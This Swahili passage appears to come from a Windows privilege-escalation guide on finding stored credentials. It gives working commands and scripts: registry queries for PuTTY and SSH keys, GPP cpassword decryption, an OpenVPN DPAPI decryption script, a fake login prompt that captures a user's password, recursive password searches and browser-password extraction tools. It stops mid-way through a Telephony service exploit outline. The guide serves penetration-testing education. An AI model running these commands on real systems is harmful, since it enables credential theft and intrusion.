Usakinishaji wa Openfire unaotumia hifadhidata yake iliyopachikwa unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` pamoja na sifa ya `passwordKey`. [Hati za Openfire za user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa nywila zinaweza kuhifadhiwa kama maandishi ya kawaida au kusimbwa kwa njia fiche kwa ufunguo uliohifadhiwa kwenye sifa hiyo. Nywila iliyorejeshwa ina umuhimu kwa kuongeza ruhusa tu ikiwa bado ni halali kwa utambulisho wenye ruhusa za juu zaidi; jina la faili pekee halithibitishi ufikiaji wa kusoma wala matumizi tena ya kitambulisho. Njia hiyo ni kidokezo cha uorodheshaji, kwa hiyo usijumuishe yaliyomo kwenye hifadhidata na vitambulisho kwenye matokeo ya kawaida ya uorodheshaji.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua milango na kiolesura cha bind kilichosanidiwa kwa dashibodi ya msimamizi hata kama hifadhidata ya nje inatumika. Kwa kawaida, Openfire huunganisha dashibodi yake ya msimamizi kwenye loopback; akaunti ya ndani bado inaweza kufikia anwani hiyo ikiwa listener inaendesha. Kagua kwa pamoja listener halisi, jukumu la msimamizi lililoidhinishwa, sera ya kupakia plugin na utambulisho wa huduma ya Openfire. Msimamizi anayeweza kusakinisha plugin anaweza kusababisha msimbo wa plugin kuendeshwa katika muktadha wa huduma, ambao unaweza kuwa na ruhusa za juu sana ikiwa huduma inaendeshwa kama LocalSystem. Nywila inayolingana ya akaunti au njia ya usanidi inayosomeka pekee haithibitishi ufikiaji wa dashibodi ya msimamizi au utekelezaji wa msimbo. Tazama [mwongozo wa vendor kuhusu usakinishaji na usimamizi wa plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [sifa ya API ya kupakia plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa seva ya usimamizi wa uchunguzi wa kidijitali

Usanidi wa seva ya Velociraptor, ambao mara nyingi huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya CA ya ndani. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma ufunguo huo, anaweza kutoa cheti cha mteja cha API. Iwapo hilo litasababisha ruhusa za juu zaidi hutegemea majukumu ya watumiaji wa seva, ufikikaji wa API na utambulisho ambao seva au agent lengwa huendeshwa nao. Usanidi wa mteja huwa na nyenzo tofauti; kuupata hakuthibitishi ufikiaji wa CA ya seva. Baadhi ya usakinishaji huhifadhi ufunguo binafsi wa CA nje ya mtandao, hivyo huenda usanidi wa seva unaosomeka usiwe na ufunguo wa kusaini.

Kwenye seva ya Windows, kagua ACL ya usanidi wa **seva** kwenye saraka yake ya usakinishaji na nakala zozote za chelezo zilizolindwa. Eneo linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya huduma ikiwa ni tofauti. Thibitisha kuwa utambulisho wa sasa unaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha ufunguo binafsi kwenye logi au matokeo ya uorodheshaji. Mtiririko wa kazi wa vendor wa `config api_client` hutumia ufunguo wa CA kutoa cheti cha mteja, lakini jukumu bora upande wa seva linahitajika pia; kuunda au kubadilisha jukumu kunaweza kuhitaji ruhusa ya kuandika datastore au kuwasha upya huduma. Utambulisho wa seva wenye ruhusa za juu uliopo tayari unaweza kutoa njia hata kama ruhusa hizo za kuandika hazipatikani. Hoja za API zenye ruhusa za utekelezaji huendeshwa katika muktadha husika wa seva au agent, ambao unaweza kuwa na ruhusa za juu sana.

Linda usanidi wa seva na nakala za chelezo kwa ACL zenye vizuizi, hifadhi ufunguo wa kusaini wa CA nje ya mtandao inapowezekana, na punguza majukumu ya API pamoja na ufikiaji wa listener. Tazama [hati za API za Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni session manager tofauti. Hifadhi yake ya asili iliyosimbwa inaweza kuwa katika `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, huku nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa kuhamisha wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema kuwa exports husimbwa kwa nenosiri na zinaweza kuwa na sessions, keys, scripts, tags na relationships; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha mahali ilipo hifadhi ya asili. Kagua ruhusa za faili na paths kwanza. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kuwa credential yoyote iliyohifadhiwa bado inafanya kazi au ina privileges za juu zaidi.

### Funguo za Host za PuTTY SSH

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Funguo za SSH kwenye registry

Funguo za faragha za SSH zinaweza kuhifadhiwa ndani ya ufunguo wa registry `HKCU\Software\OpenSSH\Agent\Keys`, kwa hiyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukikuta ingizo lolote ndani ya njia hiyo, huenda likawa ufunguo wa SSH uliohifadhiwa. Umehifadhiwa kwa njia iliyosimbwa kwa njia fiche, lakini unaweza kufumbuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha kompyuta, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana kuwa mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Sajili ya HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji kwa kutumia funguo zisizolingana.

### Faili zisizohudumiwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala za chelezo za SAM na SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Anza kwa kukagua saraka za backup au image zinazoweza kufikiwa ndani ya kompyuta, na uchunguze **majina ya faili zilizo ndani ya image** kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives ziko wazi, na faili za kawaida za `install.wim`, `boot.wim`, na image za recovery mara nyingi hupotosha. SMB share ni njia tofauti ya kufikia faili na inapaswa kukaguliwa tu ikiwa iko ndani ya wigo wa kazi. Tazama mwongozo wa Microsoft kuhusu [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud Credentials

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa kwenye cache

Hapo awali kulikuwa na kipengele kilichoruhusu kusambaza akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, manenosiri ndani ya GPP hizi, yaliyosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliowekwa wazi kwenye nyaraka, yangeweza kusimbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilikuwa hatari kubwa, kwani lingeweza kuruhusu watumiaji kupata ruhusa zilizoinuliwa.

Ili kupunguza hatari hii, kazi ilitengenezwa ili kutafuta faili za GPP zilizohifadhiwa kwenye cache ya ndani na zilizo na sehemu ya "cpassword" isiyo tupu. Baada ya kupata faili kama hiyo, kazi husimbua nenosiri na kurudisha object maalum ya PowerShell. Object hii ina maelezo kuhusu GPP na mahali faili ilipo, hivyo kusaidia kutambua na kurekebisha dosari hii ya usalama.

Tafuta faili hizi katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye taarifa za kuingia:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu za chelezo kwenye webroot ya IIS

Kumbukumbu ya zamani ya chelezo ya ZIP iliyowekwa moja kwa moja kwenye webroot inayohudumia maudhui inaweza kufichua faili za usanidi za awali na taarifa za uthibitishaji zinazoweza kutumika tena. Kagua njia halisi iliyosanidiwa ya tovuti na uhakikishe kama kumbukumbu hiyo inafikika kupitia HTTP kabla ya kuichukulia kama ufichuzi. Njia chaguomsingi ya `C:\inetpub\wwwroot` ni eneo linalowezekana tu. Orodha ya haraka ya faili za ndani inaweza kuonyesha majina na ukubwa bila kufungua kumbukumbu:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kuwa ina secret au kuwa credential iliyopatikana inatoa privilege ya juu zaidi.

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba taarifa za kuingia

Unaweza **kumwomba mtumiaji aweke taarifa zake za kuingia au hata taarifa za kuingia za mtumiaji mwingine** ikiwa unafikiri anaweza kuzijua (kumbuka kwamba **kumwomba mteja moja kwa moja taarifa za kuingia** ni **hatari sana**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **passwords** katika **clear-text** au **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Database za Password Safe v3 kwa kawaida hutumia kiendelezi `.psafe3`. Chukulia jina la faili linalolingana kuwa dalili ya vault iliyosimbwa kwa njia fiche; kuwepo kwake hakuthibitishi kwamba unaweza kuisoma, kuifungua au kutumia credentials zozote zilizohifadhiwa. Unapokagua mahali faili hizo zimehifadhiwa, angalia wasifu wa watumiaji unaoweza kufikia na mizizi iliyosanidiwa ya kushiriki faili.

Faili ya KeePass `.kdbx` inayosomeka nayo ni dalili tu ya vault iliyosimbwa kwa njia fiche. Ili kuifungua, unahitaji nenosiri kuu halisi pamoja na faili yoyote ya ufunguo au vipengele vya akaunti vilivyosani­diwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya hash ya LM:NT katika ingizo, thibitisha akaunti iliyotajwa na kama hash ya NT ni ya sasa na inakubaliwa na huduma ya NTLM ya lengwa kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault lenyewe halitoi haki za Administrator au SYSTEM; ufikiaji wa huduma ya mbali, haki za akaunti na hatua yoyote tofauti ya kutekeleza huduma lazima pia ziwepo. Orodha ya vipengee inapaswa kuripoti njia ya vault na kama inaweza kusomwa, si kuchapisha hifadhidata au credentials zilizohifadhiwa.

Tafuta katika faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credentials katika RecycleBin

Kagua maingizo ya Recycle Bin unayoweza kufikia ili kutafuta backups na configuration archives zilizofutwa, pamoja na faili ambazo majina yake yanataja credentials waziwazi. Backup ya `.7z`, `.zip`, au `.rar` inayofaa inaweza kuwa na umri wa miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa katika rekodi ya `$I`, na faili iliyofutwa kama ingizo lake sawia la `$R`; kagua metadata na uhakikishe utambulisho wa sasa una ruhusa ya kusoma kabla ya kufungua archive. Kuonekana kwa faili hutegemea volume, user SID, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kuwa hakuna backup inayoweza kurejeshwa. Chukulia jina la archive kama mgombea wa kukaguliwa, si uthibitisho kwamba ina secret halali.

`.pfx` iliyofutwa unayoweza kufikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key unayoweza kufikia, key hiyo inaweza kusaini PowerShell script iliyobadilishwa; [PowerShell inahitaji certificate ya code-signing yenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za AppLocker publisher hutathmini utambulisho wa msaini na wigo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti tofauti unahitaji utambulisho wa sasa uweze kurekebisha script husika, sheria inayotumika ikubali sahihi inayotokana nayo kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye privileges za juu iendeshe script hiyo kwa kweli. Jina la faili la `.pfx`, subject ya certificate, au script inayoweza kuandikwa pekee havithibitishi mnyororo huu. Kagua metadata, ACLs, policy, na amri ya scheduled task kabla ya kufungua private-key material au kuanzisha task hiyo.

Pia kagua databases za profile za messaging client unazoweza kufikia, notes, na faili zilizopokelewa ili kutafuta vidokezo vya credentials. BitLocker recovery export inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya backup archive yenye jina. Nyenzo hizo zinaweza kutoa ufikiaji wa data volume tofauti iliyosimbwa kwa njia fiche na iliyo na backups za zamani; kagua volume na archive tu ikiwa umeidhinishwa kufanya hivyo. Ikiwa backup ina `NTDS.dit`, kurejesha credentials za domain ukiwa nje ya mtandao kunahitaji pia hive ya `SYSTEM` inayolingana, kama ilivyoelezwa katika [workflow ya backups na privileged-groups](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kuwa kuna recovery key inayoweza kutumika au domain backup.

Ili **kurejesha passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Funguo nyingine za registry zinazoweza kuwa na credentials**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Toa openssh keys kutoka kwenye registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Browsers

Unapaswa kuangalia dbs ambako nywila kutoka **Chrome, Edge, au Firefox** huhifadhiwa.\
Pia angalia historia, bookmarks na favourites za browsers ili kuona kama huenda **nywila zimehifadhiwa** humo.

Kwa profile ya kawaida ya **Default** ya Edge ya mtumiaji wa sasa, `Login Data` iko kwenye `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ilhali `Local State` iko kwenye saraka yake mama ya `User Data`. [Microsoft inaandika eneo la kawaida la profile](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); profile nyingine au sera ya `UserDataDir` inaweza kubadilisha eneo hilo. Kuwepo kwa faili ni kidokezo tu cha mahali pa kuhifadhi credentials: thibitisha kuwa faili zinaweza kusomwa, kuwa una muktadha wa DPAPI wa mtumiaji husika au key material nyingine iliyoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye privileges zaidi. Kuhesabu paths pekee hakuhitaji kufungua database au kuchapisha nywila zilizofichuliwa.

Kwa Firefox, [Mozilla inaandika](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kwamba `key4.db` na `logins.json` za profile ni faili zinazolingana za key na login zilizosimbwa. Kuwepo kwake ni kidokezo tu: angalia kama faili zote mbili zinaweza kusomwa, kama kuna entries zilizohifadhiwa, na kama Primary Password inalinda key kabla ya kuhitimisha kuwa credentials zinaweza kutumika. Ikiwa credential iliyopatikana ni ya akaunti ya domain, kagua kando haki halisi za akaunti hiyo za kudhibiti vikundi na haki za kikundi za [kusoma au kufungua kwa decryption nywila za LAPS](../active-directory-methodology/laps.md); browser artifacts pekee hazithibitishi kuwa kuna njia ya kupata administrator privileges.

Tools za kutoa nywila kutoka browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Kufunika COM DLL**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kwa class ID (CLSID)**, na kila kipengele hutoa utendakazi kupitia interface moja au zaidi, zinazotambuliwa kwa interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface**, mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata child registry **InProcServer32**, iliyo na **default value** inayoelekeza kwenye **DLL**, na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Browsers - Kufunika COM DLL: Ndani ya CLSIDs za registry hii unaweza kupata child registry InProcServer32, iliyo na default value inayoelekeza kwenye DLL na value...](<../../images/image (729).png>)

Kimsingi, ukiweza **kubadilisha DLL yoyote** itakayotekelezwa, unaweza **kuongeza privileges** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.

Ili kujifunza jinsi attackers wanavyotumia COM Hijacking kama utaratibu wa persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa nywila kwenye files na registry**

**Tafuta yaliyomo kwenye files**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili lenye jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya funguo na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **itekeleze kiotomatiki kila moduli ya POST ya metasploit inayotafuta taarifa za kuingia** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **majina ya watumiaji** na **nywila** za zana mbalimbali zinazohifadhi data hii kama maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria **process inayoendeshwa kama SYSTEM inafungua process mpya** (`OpenProcess()`) yenye **ufikiaji kamili**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye privileges za chini, lakini ikirithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **ufikiaji kamili wa process yenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya process yenye privileges za juu iliyoundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili jingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia handles nyingine zilizo wazi za processes na threads zinazorithiwa zikiwa na viwango tofauti vya permissions (siyo ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo roles hufafanuliwa kama **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe inaweza **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges za juu** inayowasiliana kupitia pipe unayoweza kuiga kunakupa fursa ya **kupata privileges za juu zaidi** kwa kujifanya kuwa process hiyo inapoingiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio hili, miongozo muhimu inapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo inaruhusu **kunasa mawasiliano ya named pipe kwa kutumia tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) ikiwa katika hali ya server huonyesha `\\pipe\\tapsrv` (MS-TRP). Client aliyeidhinishwa kwa mbali anaweza kutumia vibaya njia ya matukio ya async inayotegemea mailslot ili kubadilisha `ClientAttach` kuwa **uandishi wa baiti 4** kwenye faili yoyote iliyopo ambayo `NETWORK SERVICE` inaweza kuiandikia, kisha apate haki za msimamizi wa Telephony na kupakia DLL yoyote kama huduma. Mchakato kamili:

- `ClientAttach` huku `pszDomainUser` ikiwekwa kuwa njia iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa matukio ya async.
